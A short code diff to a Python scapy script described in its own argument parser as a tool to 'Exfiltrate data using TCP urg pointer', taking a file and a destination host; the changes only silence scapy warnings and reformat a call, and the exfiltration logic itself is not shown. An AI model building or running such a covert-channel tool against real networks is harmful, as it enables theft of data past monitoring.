@@ -1,5 +1,7 @@
+import logging
 import random
 import sys
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import TCP, IP, send
 
 
@@ -69,8 +71,7 @@ if __name__ == "__main__":
     import argparse
     parser = argparse.ArgumentParser(
                description="Exfiltrate data using TCP urg pointer",
-               add_help=True
-             )
+               add_help=True)
     parser.add_argument('filename', metavar='FILE', action='store',
                         help='File to exfiltrate')
     parser.add_argument('-H', '--host', required=True, action='store',
